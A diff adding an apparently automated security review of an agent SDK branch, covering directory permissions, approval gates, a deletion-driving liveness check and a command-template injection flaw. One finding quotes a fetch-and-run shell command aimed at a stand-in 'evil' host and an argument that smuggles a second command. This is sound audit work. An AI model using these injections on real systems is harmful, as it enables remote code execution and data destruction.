@@ -1,0 +1,444 @@
+agent: review-crossval-4-6-absorption-domain-security
+review_target: origin/develop..HEAD (measured against main) for plan crossval-4-6-absorption
+domain: security
+domain_specific_patterns_checked:
+  - 'G10 honest enforcement — a control that does not enforce what its prose claims (rules/system-design-guardrails.md)'
+  - 'Fail-closed on absent evidence (rules/error-handling.md 2, 3) — approval gates and liveness verdicts'
+  - 'Credential-store mode contract: 0700 dir / 0600 file, and assertSecureModes on the READ path (SDK credential-store.ts:122-137)'
+  - 'T2.4 invariant as stated in its own commit: the guarantee has to hold for ALL creators of ~/.theokit'
+  - 'Trust boundary declaration — which on-disk data is attacker-influenced, and what is validated before it decides a destructive action'
+  - 'Single-pass expansion / injection containment in command-template.ts'
+  - 'Runtime immutability of exported security defaults (ReadonlySet/ReadonlyMap/as const are compile-time only)'
+  - 'No secret value in code, logs, diagnostics or findings'
+
+verifications_of_prior_findings:
+  - id: 'F-dom-2 (prior review) — OAuth token dir mode'
+    status: STILL_OPEN
+    where: '../theokit-sdk/packages/sdk/src/internal/mcp/token-storage.ts:77 -> internal/persistence/atomic-write.ts:247'
+  - id: 'F-dom-1 (prior review) — approval gate widened'
+    status: STILL_OPEN
+    where: 'packages/agents/src/bridge/approval-decision.ts:52'
+  - id: 'F-dom-5 (prior review) — mutable security singletons'
+    status: STILL_OPEN_AND_REPRODUCED
+    where: 'packages/agents/src/bridge/approval-decision.ts:41,52 and ../theokit-tui/src/tool-presentation.ts:148,294'
+  - id: 'F-dom-14 (prior review) — shouldAutoApprove returns undefined'
+    status: STILL_OPEN_AND_REPRODUCED
+    where: 'packages/agents/src/bridge/approval-decision.ts:79-89'
+  - id: 'F-dom-5 (prior review, security section) — single-pass template claim'
+    status: STILL_OPEN_AND_REPRODUCED
+    where: 'packages/agents/src/config/command-template.ts:22,120'
+
+findings:
+  - id: F-dom-1
+    severity: HIGH
+    file: ../theokit-sdk/packages/sdk/src/internal/persistence/fs-session-store.ts
+    line: 117
+    plan_ref: T2.4 — "the transcript root was born writable by other users"; Q3 proposal "route the remaining creators through ensureSecureDir"
+    domain_anchor: >-
+      T2.4's own commit messages (SDK 7cb57baff / theokit 10577fe3): "the mode argument is a no-op on
+      an existing directory, so the permissions belong to whichever code path created it first ...
+      Fixing one creator therefore fixes nothing — the guarantee has to hold for all of them."
+      SDK credential-store.ts:117-121 — "a writable dir lets an attacker replace the credential file
+      with a symlink to their own 0600 file."
+    summary: >-
+      T2.4's 0o700 in appendJsonl is dead on the primary path. FsSessionStore creates the SAME
+      directory — and every ancestor, including ~/.theokit itself — with a bare recursive mkdir at
+      :117 and :166, and both run BEFORE appendJsonl. Under umask 002 the shared credential root is
+      born 0775 and is never repaired, which is exactly the shape T2.4 set out to eliminate.
+    evidence: |
+      Two unhardened creators of the very directory T2.4 hardened, in the same repo:
+
+      ```ts
+      // fs-session-store.ts:112-145  appendRecords
+      const path = transcriptPath(this.#baseDir, this.#cwd, agentId);
+      await mkdir(dirname(path), { recursive: true });   // <-- no mode; runs FIRST
+      await withFileLock(path, async () => {
+        for (const record of records) appendJsonl(path, record);  // <-- T2.4's mode:0o700, too late
+      });
+
+      // fs-session-store.ts:164-168  acquire()  — runs even earlier, at session init
+      const path = transcriptPath(this.#baseDir, this.#cwd, agentId);
+      await mkdir(dirname(path), { recursive: true });   // <-- no mode
+      ```
+      `#baseDir` defaults to `transcriptRoot()` = `~/.theokit` (session-transcript.ts:339-343), and a
+      recursive mkdir creates every missing ancestor with the same mode — so `~/.theokit` and
+      `~/.theokit/projects` are created here too.
+
+      MEASURED (node, umask 002, this machine):
+        after fs-session-store mkdir : 775   ~/.theokit: 775
+        after appendJsonl T2.4 fix   : 775   ~/.theokit: 775
+      The 0o700 argument is a no-op on the already-created tree — the exact sentence T2.4's own
+      commit message uses to justify the fix.
+
+      Why 0775 on `~/.theokit` is not merely a transcript-privacy issue:
+        * credential-store.ts:41-49 — `credentialHome` IS `~/.theokit` (dirName ".theokit",
+          openai-chatgpt.ts:30). `assertSecureModes` (credential-store.ts:122-129) THROWS on it, so
+          an auth read fails on a machine where the session path won the race — the
+          self-inconsistency Q3 named, still live.
+        * providers/discovery.ts:38 — `~/.theokit/plugins/trusted-providers.json` is the allowlist
+          that gates `await import(pathToFileURL(indexPath).href)` at discovery.ts:125, i.e.
+          arbitrary code execution in the agent process. That file is read with NO mode check
+          (loadTrustedNames, discovery.ts:48-88). A group-writable `~/.theokit` lets another local
+          user create `plugins/`, write the allowlist and drop the plugin body.
+
+      T2.4's regression test cannot see this: transcript-dir-mode.test.ts:33 calls `appendJsonl`
+      directly, never through `FsSessionStore`, so it is green while the shipped path is defeated.
+    recommended_action: >-
+      Give both call sites the same treatment as appendJsonl — mkdir(dirname(path), { recursive:
+      true, mode: 0o700 }) at fs-session-store.ts:117 and :166 — and add a test that drives
+      FsSessionStore.acquire()/appendRecords() (not appendJsonl) under a forced umask, asserting
+      mode & 0o022 === 0 on BOTH the leaf and the baseDir root. Better still, give one owner
+      responsibility for creating anything under transcriptRoot() so a future creator cannot reopen
+      it silently. Until the root itself is guaranteed, assertSecureModes should also gate the read
+      of trusted-providers.json (discovery.ts:48), which today trusts a file whose directory nothing
+      checks.
+
+  - id: F-dom-2
+    severity: HIGH
+    file: ../theokit-sdk/packages/sdk/src/internal/mcp/token-storage.ts
+    line: 77
+    plan_ref: T1.3 (publish the MCP OAuth subpath) + T2.4 / Q3 — "route the remaining creators through ensureSecureDir"
+    domain_anchor: SDK credential-store.ts:117-121 and :122-137 (0700 dir / 0600 file, enforced on the READ path via assertSecureModes)
+    summary: >-
+      STILL OPEN, and now published. The OAuth refresh-token store writes through atomicWriteJson,
+      whose parent-directory mkdir carries no mode (atomic-write.ts:247), so ~/.theokit can be born
+      0775; the file's 0o600 buys nothing inside a directory another local user can write. The read
+      path has no mode gate at all, unlike its credential sibling. T1.3 exports both functions as
+      @theokit/sdk/mcp-auth.
+    evidence: |
+      ```ts
+      // token-storage.ts:22
+      const FILE_PATH = join(homedir(), ".theokit", "mcp-tokens.json");
+      // token-storage.ts:77-79
+      await atomicWriteJson(FILE_PATH, allTokens);
+      try { chmodSync(FILE_PATH, 0o600); } catch { /* windows */ }
+      ```
+      ```ts
+      // internal/persistence/atomic-write.ts:247 — no mode, unlike jsonl.ts:142 which T2.4 fixed
+      await mkdir(dirname(filePath), { recursive: true });
+      ```
+      Three gaps on one now-public path:
+        1. Directory mode: as above. Same root as F-dom-1; second unhardened creator.
+        2. Read path: getTokens (token-storage.ts:90-106) parses the bundle with no
+           assertSecureModes; the sibling readAuthFile calls it at credential-store.ts:193.
+        3. Order: chmodSync runs AFTER atomicWriteJson, so the file exists at the umask mode for a
+           window.
+
+      Now shipped as public API — packages/sdk/src/mcp-auth.ts:16-21 re-exports getTokens and
+      setTokens, and packages/sdk/package.json:241-250 maps "./mcp-auth" to dist.
+
+      No token VALUE appears in any log or diagnostic on this path — verified; the diag at
+      token-storage.ts:39 names the file path and the keytar remedy only.
+    recommended_action: >-
+      Add an optional dirMode to atomicWriteJson/atomicWriteText and have setTokens pass 0o700, or
+      route setTokens through the same ensureSecureDir shape as
+      packages/agents/src/hooks/secure-store.ts:54. Add assertSecureModes(dirname(FILE_PATH),
+      FILE_PATH) at the top of the file branch of getTokens. Do both before the publish that carries
+      ./mcp-auth — an exported credential helper is a promise about how the credential is kept.
+
+  - id: F-dom-3
+    severity: HIGH
+    file: packages/agents/src/session/liveness-oracle.ts
+    line: 181
+    plan_ref: T3.2 — "the liveness question comes home to the package that made it hard"; fix commit 7fea1388
+    domain_anchor: >-
+      liveness-oracle.ts:4-6 — "encodeProjectDir(cwd) is a one-way street. /a/b and /a-b produce the
+      same name"; :25-28 — "Callers DELETE on dead ... deleting on 'could not tell' is data loss";
+      rules/error-handling.md 2 (validate inputs at the system boundary)
+    summary: >-
+      `dead` — the verdict that deletes — is decided from the FIRST sampled transcript whose recorded
+      cwd encodes to the directory name, and the module's own preamble says that encoding is
+      many-to-one. One transcript belonging to a deleted colliding cwd therefore condemns the
+      directory a LIVE project is still using, without the module ever consulting the candidate pool
+      that contains it.
+    evidence: |
+      ```ts
+      // liveness-oracle.ts:168-183 — first match wins, sample window default 3
+      for (const file of entries.filter((f) => f.endsWith('.jsonl')).slice(0, samples)) {
+        ...
+        if (encodeProjectDir(cwd) === name) return { kind: 'found', cwd }   // <- short-circuits
+      }
+      // :260-276 — the only path that can produce `dead`
+      if (recorded.kind === 'found') { const at = probe(recorded.cwd); ...
+        : { liveness: 'dead', reason: `recorded cwd ${recorded.cwd} is gone` } }
+      ```
+      MEASURED against the real module (vitest probe, since deleted):
+
+        case 1 — two cwds that collide by construction
+          live = /home/op/my-app   (exists, and IS in candidatePaths)
+          gone = /home/op/my/app   (deleted)   encode(gone) === encode(live)
+          readdir yields the gone one first
+          verdict: { liveness: 'dead', reason: 'recorded cwd /home/op/my/app is gone' }
+
+        case 2 — a planted transcript whose recorded cwd merely encodes the same way
+          planted cwd = '_home_op_my_app'   (never existed)
+          verdict: { liveness: 'dead', reason: 'recorded cwd _home_op_my_app is gone' }
+
+      Both return `dead` while the live project exists and is present in the candidate pool — the
+      pool is never reached, because the recorded-cwd branch `continue`s the outer loop at :277.
+      This is a narrower re-entry of the defect 7fea1388 exists to fix ("6 of 6 live projects
+      classified dead, on the path where the caller DELETES").
+
+      On the trust boundary, as asked: ~/.theokit/projects/<enc>/*.jsonl is DATA, not a fact about
+      the system — the file is user-writable, and under F-dom-1 it can be group-writable. The
+      docstring at :152-153 states the encode-back check's purpose ("a stray or copied transcript
+      would speak for a project it never belonged to") but never states that the input is
+      attacker-influenceable, and the check is NOT sufficient for what it is asked to decide: it
+      constrains the recorded cwd to the same equivalence class, which by :4-6 has many members.
+      One planted file, sampled first, is enough — case 2.
+
+      On "can any path in the module delete": no. FsSeam is exists/listEntries/firstLine only, and
+      the module performs no write or unlink. The exposure is entirely in the verdict handed to a
+      caller the module instructs to delete.
+    recommended_action: >-
+      Require exhaustive evidence rather than first-match: `dead` should hold only when EVERY
+      distinct recorded cwd found across the sampled transcripts is absent, and should degrade to
+      `undetermined` when the samples disagree or when the sample window truncated the listing. State
+      the trust boundary in the docstring ("the recorded cwd is data from a user-writable file; the
+      encode-back check narrows it to the collision class, which is not a single path"). Add both
+      cases as regression tests — neither exists in liveness-oracle-recorded-cwd.test.ts, whose
+      closest case (:138) only covers a cwd that encodes to a DIFFERENT name.
+
+  - id: F-dom-4
+    severity: HIGH
+    file: packages/agents/src/config/command-template.ts
+    line: 22
+    plan_ref: T3.3 — "a custom command is now interpreted by the package that reads it"
+    domain_anchor: rules/system-design-guardrails.md G10 (honest enforcement — never claim a control the code does not provide)
+    summary: >-
+      The module's headline security claim is false as written. Line 22 says the inertness property
+      is "structural now, not filtered: there is no later scan to escape into" — but argument
+      substitution at :120 produces a string that IS scanned again at :133, so an ARGUMENT can
+      introduce a shell segment into a template that contained none, and can splice a second command
+      inside one that did. The boundary is real for file content and shell output; it is narrower
+      than the claim, and the gap is the injection direction. Under G10 the defect is the claim.
+    evidence: |
+      ```ts
+      // command-template.ts:18-22
+      // **Shell and file references are resolved in ONE scan ...**
+      // The property is structural now, not filtered: there is no later scan to escape into.
+      ```
+      ```ts
+      // :120-130   pass 1 — arguments substituted into the template
+      const withArgs = await replaceAsync(template, PLACEHOLDER_REGEX, ...)
+      // :133       pass 2 — the RESULT of pass 1 is scanned for shell and file references
+      return replaceAsync(withArgs, REFERENCE_REGEX, async (match) => { ... deps.shell(command) })
+      ```
+      MEASURED against the real module (vitest probe, since deleted):
+
+        A — an argument INTRODUCES a shell segment into a template that had none
+            template: 'Summarize: $1'
+            rawArgs : a quoted argument whose body is a backticked shell reference
+            deps.shell called with: 'curl http://evil/x | sh'
+
+        B — a QUOTED argument concatenates a second command inside an existing segment
+            template: '!`git diff $1`'
+            rawArgs : '"HEAD; <destructive command>"'
+            deps.shell called with: 'git diff HEAD; <destructive command>'
+
+      In B, quoting — the user's intuitive escaping — is what enables it: ARGS_REGEX (:38) treats the
+      quoted run as one token and QUOTE_TRIM_REGEX (:39) strips the quotes before the value is
+      spliced UNQUOTED into the shell string.
+
+      The justification at :24-27 ("arguments are the user's direct input for THIS invocation") is an
+      assumption about the caller that the module cannot enforce, does not test and offers no way to
+      opt out of. It also does not cover A: there the template author wrote a purely textual command,
+      so a reviewer approving that command has no way to know it can execute shell. The trust gate
+      that DOES exist (custom-commands.ts:117-127, projectTrusted) gates loading the body, not the
+      arguments — a trusted no-shell template is still an execution surface.
+
+      No test covers either shape: the only case in the "deliberate re-scan" describe block
+      (command-template.test.ts:187-196) asserts the benign direction, and nothing asserts a boundary.
+    recommended_action: >-
+      Pick one and make the file say it. Either (a) narrow the claim at :18-22 to what holds — file
+      content and shell output are inert; ARGUMENTS are re-scanned and can both introduce and extend
+      a shell segment — and add both cases as tests naming that as accepted behaviour with the caller
+      obligation spelled out; or (b) close it: substitute arguments in the SAME scan as references so
+      an argument's bytes are never re-matched, or add an opt-out (allowArgumentReferences?: boolean,
+      default false) for callers whose arguments are not keyboard input. Leaving the strong claim
+      above the weaker behaviour is the G10 failure itself.
+
+  - id: F-dom-5
+    severity: HIGH
+    file: packages/agents/src/bridge/approval-decision.ts
+    line: 52
+    plan_ref: ADR D5 — "absorb the consumer's scar tissue, not its interface"; T2.1 / T5.1
+    domain_anchor: >-
+      Baseline Context invariant for packages/tui/src/consent/approval-mode.ts — "auto-edit stays
+      bounded by the tool's write scope"; rules/error-handling.md 2 (fail-closed)
+    summary: >-
+      STILL OPEN, verbatim. The absorbed default write-scoped set is three tools where the only real
+      consumer's is one, so adopting the framework symbol widens an approval gate: edit_file stops
+      requiring a human in auto-edit, with no sandbox posture required at all. Nothing in the branch
+      — test, changeset or CHANGELOG — records the widening.
+    evidence: |
+      ```ts
+      // packages/agents/src/bridge/approval-decision.ts:52-56  (unchanged since the prior review)
+      export const WRITE_SCOPED_TOOLS: ReadonlySet<string> = new Set([
+        'apply_patch', 'edit_file', 'write_file',
+      ])
+      ```
+      Consumer being replaced (TheoCode/packages/tui/src/consent/approval-mode.ts:5):
+        const EDIT_TOOLS = new Set(['apply_patch'])
+      and it DOES register the extra name (TheoCode/packages/agent/src/tools/registry.ts:90-91).
+
+      The widening is still asserted as intended, with no posture argument
+      (packages/agents/tests/unit/approval-decision.test.ts:68-70):
+        expect(shouldAutoApprove('auto-edit', 'edit_file')).toBe(true)
+        expect(shouldAutoApprove('auto-edit', 'write_file')).toBe(true)
+      and :95-103 pins the three-name default as correct.
+
+      Re-verified on the current tree: .changeset/ holds only
+      liveness-oracle-recorded-cwd-major.md and session-lifecycle-async-major.md — neither mentions
+      approval; grep for auto-edit / edit_file in packages/agents/CHANGELOG.md returns nothing for
+      this release. The writeScopedTools escape hatch (:59-61) exists, but nothing requires T5.1's
+      adoption to use it.
+    recommended_action: >-
+      Ship the default as the measured consumer semantics (new Set(['apply_patch'])) and let a
+      product widen it explicitly; or keep the three and make T5.1's adoption pass
+      { writeScopedTools: new Set(['apply_patch']) } with a regression test in TheoCode pinning that
+      edit_file still prompts. Either way record it under Security/Changed in
+      packages/agents/CHANGELOG.md — a widened approval gate is consumer-visible.
+
+  - id: F-dom-6
+    severity: MEDIUM
+    file: packages/agents/src/bridge/approval-decision.ts
+    line: 41
+    plan_ref: T2.1 — the auto-approve rule as a callable symbol; T3.1 — overridable defaults
+    domain_anchor: rules/type-safety.md (ReadonlySet/ReadonlyMap/as const are compile-time only); rules/system-design-guardrails.md G10
+    summary: >-
+      STILL OPEN and now measured. WRITE_SCOPED_TOOLS, APPROVAL_MODES and DEFAULT_TOOL_PRESENTATION
+      are exported module-level singletons that are mutable at runtime; one of them decides
+      auto-approval for the whole process, and one carries a docstring asserting the opposite.
+    evidence: |
+      MEASURED against the real module (vitest probe, since deleted):
+        Object.isFrozen(APPROVAL_MODES)                                      -> false
+        (WRITE_SCOPED_TOOLS as Set<string>).add('run_shell')
+        shouldAutoApprove('auto-edit', 'run_shell')                          -> true
+      Any code in the process — a plugin, a transitive dependency, a JS consumer with no types —
+      turns a shell tool into an auto-approved one for every caller. The type says nothing at runtime.
+
+      The false claim is still on disk in the sibling:
+        ../theokit-tui/src/tool-presentation.ts:148
+          "* The defaults. Frozen as a `ReadonlyMap` because a surface that mutated it would change
+           every other ..."
+        ../theokit-tui/src/tool-presentation.ts:294
+          export const DEFAULT_TOOL_PRESENTATION: ReadonlyMap<string, ToolPresentation> =
+            new Map(DEFAULT_ENTRIES);
+      It is not frozen; the sentence describes a control that does not exist (G10).
+    recommended_action: >-
+      For WRITE_SCOPED_TOOLS prefer a factory — writeScopedTools(): ReadonlySet<string> returning a
+      fresh Set — so no caller shares a mutable security default. Object.freeze(APPROVAL_MODES). For
+      DEFAULT_TOOL_PRESENTATION, either freeze behind an accessor or delete the "Frozen" sentence; do
+      not leave the claim and the code disagreeing.
+
+  - id: F-dom-7
+    severity: MEDIUM
+    file: packages/agents/src/session/project-index.ts
+    line: 84
+    plan_ref: T2.4 — "Both now call ensureSecureDir, which this package already ships (parsimony rung 4)"
+    domain_anchor: >-
+      secure-store.ts:49-52 — "@throws when the mode cannot be repaired — refusing beats running with
+      a store another user can rewrite, because that store decides what executes";
+      rules/system-design-guardrails.md G10, G9 (no silent paths)
+    summary: >-
+      T2.4 adopted ensureSecureDir for its repair and discarded the half that is the security
+      refusal. Both new call sites swallow the documented @throws and continue, so in the one
+      scenario the helper exists for — a loose directory whose chmod does not hold — the process
+      keeps running with no warning of any kind.
+    evidence: |
+      ```ts
+      // packages/agents/src/session/project-index.ts:82-87
+      ensureSecureDir(sidecar)
+      writeFileSync(sidecar, `${cwd}\n`, 'utf8')
+      } catch {
+        // Intentionally swallowed — see the docblock.
+      }
+      ```
+      ```ts
+      // packages/agents/src/session/session-pointer.ts:99-107
+      ensureSecureDir(target)
+      await atomicWriteText(target, `${sessionId}\n`)
+      return { persisted: true }
+      } catch { return { persisted: false } }
+      ```
+      The helper's contract (secure-store.ts:54-73) throws with "<dir> is mode 0775 — group or world
+      writable, and the repair did not hold. This directory decides which commands may run". Both
+      call sites turn that into, respectively, silence and { persisted: false } — which a caller
+      reads as "the pointer could not be saved", not as "your transcript root is writable by another
+      user". No AgentWarningCode, no diag, nothing.
+
+      The swallow is justified in the docblocks for the INDEX WRITE ("a throw there turns a missing
+      optimisation into a failed run") — a sound argument about the write, and not about the mode
+      refusal. Two different failures are collapsed into one catch.
+    recommended_action: >-
+      Separate the two failures: let ensureSecureDir's throw escape, or catch it distinctly and
+      surface it through the package's structured warning channel, while continuing to swallow the
+      write failure. A security control unconditionally caught by both of its call sites is not a
+      control.
+
+  - id: F-dom-8
+    severity: MEDIUM
+    file: packages/agents/src/bridge/approval-decision.ts
+    line: 79
+    plan_ref: T2.1 — the auto-approve rule as a callable symbol
+    domain_anchor: rules/error-handling.md 2 (fail-closed by decision, not by accident); rules/type-safety.md (explicit return types on public API)
+    summary: >-
+      STILL OPEN and measured. shouldAutoApprove falls out of its switch and returns undefined while
+      declaring boolean. It fails closed only because undefined is falsy — luck, not a decision — and
+      a caller that logs or serialises the verdict cannot tell "refused" from "this function did not
+      answer".
+    evidence: |
+      ```ts
+      // approval-decision.ts:79-89 — three cases, no default, no exhaustiveness guard
+      switch (mode) { case 'suggest': ... case 'auto-edit': ... case 'full-auto': ... }
+      ```
+      MEASURED: shouldAutoApprove('yolo' as never, 'run_shell') -> undefined.
+      The mode is a value a surface reads from user config or a CLI flag; TypeScript's narrowing does
+      not survive the package boundary into a JS consumer, and @theokit/agents publishes this symbol.
+    recommended_action: >-
+      Add a default arm returning false explicitly with the reason written down, or an exhaustiveness
+      guard (const _never: never = mode; return false). Add the negative case to
+      approval-decision.test.ts — the suite covers an unknown TOOL (:77-81) but not an unknown MODE.
+
+  - id: F-dom-9
+    severity: LOW
+    file: packages/agents/src/session/liveness-oracle.ts
+    line: 156
+    plan_ref: T3.2 — the liveness question absorbed into the package
+    domain_anchor: rules/error-handling.md 2 (validate inputs at the system boundary); rules/architecture.md 3 (the module owns the encoding, so it owns what a valid name is)
+    summary: >-
+      `name` — a caller-supplied string — is interpolated into a filesystem path with string
+      concatenation and no validation, in a module whose verdict the same caller uses to choose a
+      deletion target keyed by that same name.
+    evidence: |
+      ```ts
+      // liveness-oracle.ts:156
+      const dir = `${opts.projectsRoot}/${name}`
+      ```
+      Reachable today only with well-formed names (the known consumer feeds readdir entries, which
+      cannot contain a separator), so this is a hardening gap rather than a live defect. But the
+      module OWNS encodeProjectDir (:98-100) and therefore knows exactly what a valid encoded name
+      looks like (/^[A-Za-z0-9-]+$/), and the reads it performs (listEntries, firstLine) are the
+      evidence a destructive decision rests on. join() would also be the house style — every sibling
+      in packages/agents/src/session uses node:path.
+    recommended_action: >-
+      Use join(opts.projectsRoot, name) and reject a name outside the encoding's own character class
+      with an undetermined verdict naming the reason. Cheap, and it makes the module's input contract
+      enforced rather than assumed.
+
+  - id: F-dom-10
+    severity: INFO
+    file: packages/agents/src
+    line: 1
+    plan_ref: whole-branch sweep
+    domain_anchor: 'Review rule: never include a secret value in a finding; project issue policy (no secrets in bodies)'
+    summary: >-
+      No issues found on secret handling in the diff itself. No secret value is committed, logged or
+      surfaced in a diagnostic by any code this branch adds.
+    evidence: |
+      git diff main...HEAD -- packages/ piped through a grep for added lines that combine a logging
+      call (console.log/error/warn, diag) with token / secret / apiKey / api_key / password /
+      refreshToken -> 0 results.
+      The one diagnostic on the newly published credential path (token-storage.ts:39) names the file
+      path and the keytar remedy only, never the bundle.
